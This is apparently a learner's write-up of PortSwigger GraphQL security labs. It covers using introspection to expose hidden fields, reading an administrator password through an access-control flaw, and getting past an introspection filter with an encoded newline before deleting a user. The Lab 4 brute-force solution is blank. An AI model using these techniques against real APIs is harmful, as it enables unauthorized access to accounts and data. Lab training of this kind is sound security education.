
# Lab 1

## Description

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

## Solution

Navigating around the blog and looking through the HTTP request history show:

```
POST /graphql/v1
```

right clicking and selecting `GraphQL-> IntrospectionQuery` then sending the request returns the listing of a lot of parameters. Searching for `password` shows:

```
[...]
 "name": "postPassword",
  "description": null,
[...]
```

returning to the last query and adding `postPassword` to the parameters:

```
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
        	postPassword
        }
    }
```

returns:

```
[...]
 "postPassword": "u6xrq8idg2yi597iwclkl990wmqi6c3q"
[...]
```

Submitting this password and finish.

**Note:** More research into the topic needs to be done (watch youtube videos to take a break from reading docs).


# Lab 2

## Description

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username `carlos`.

Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

## Solution

Sending the introspection query as in the lab before and sending the responds to `site map`. Heading to `Target` tab lists following query:

```
query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
```

Sending this request to repeater and sending it with `id=1`:

```
query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
------
{"id":1}
```

it returns:

```
[...]
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "gkcuz8k10hm360aj4pz5"
    }
  }
}
```

Logging in to the `administrator` account and deleting user `carlos` resolves the challenge.


# Lab 3

## Description

The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

To solve the lab, find the hidden endpoint and delete `carlos`.

## Solution

Sending a GET request to:

```
GET /api
```

returns:

```
[...]
"Query not present"
```

Following this hint up with:

```
GET /api?query=test
```

returns:

```
[...]
{
  "errors": [
    {
      "locations": [
        {
          "line": 1,
          "column": 1
        }
      ],
      "message": "Invalid syntax with offending token 'test' at line 1 column 1"
    }
  ]
}
```

The GraphQL endpoint isn't well hidden.

Sending the `IntrospectionQuery` returns:

```
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

Using the same query structure as before:

```
query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
------
{"id":1}
```

returns:

```
[...]
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 5,
          "column": 5
        }
      ],
      "message": "Validation error (FieldUndefined@[getUser/password]) : Field 'password' in type 'User' is undefined"
    }
  ]
}
```

Repeating the query without `password` field:

```
query($id: Int!) {
  getUser(id: $id) {
    id
    username
  }
}
------
{"id":1}
```

returns:

```
[...]
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator"
    }
  }
}
```

So apparently the `IntrospectionQuery` prevention isn't equal on all setups. Some filters can be bypassed.

Adding a newline `\n` to the query:

```
++++__schema+%7b%0a
```

changing it to:

```
++++__schema%0a+%7b%0a
```

The server then happily replies with the full scheme. Same process, sending the response to site map. This shows a user delete method:

```
mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
  }
}
```

as well as a username lookup method:

```
query($id: Int!) {
  getUser(id: $id) {
    id
    username
  }
}
```

Using the last to find `carlos` id to be used in the `DeleteOrganizationUserInput` method:

```
query($id: Int!) {
  getUser(id: $id) {
    id
    username
  }
}
----
{"id":3}
```

returns:

```
{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```

Now sending the delete mutation:

```
mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
  }
}
---
{"input":{"id":3}}
```

returns:

```
{
  "data": {
    "deleteOrganizationUser": {
      "user": {
        "id": 3,
        "username": "carlos"
      }
    }
  }
}
```

Which solve the lab.


# Lab 4

## Description

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as `carlos`. Use the list of [authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) as your password source.


## Solution

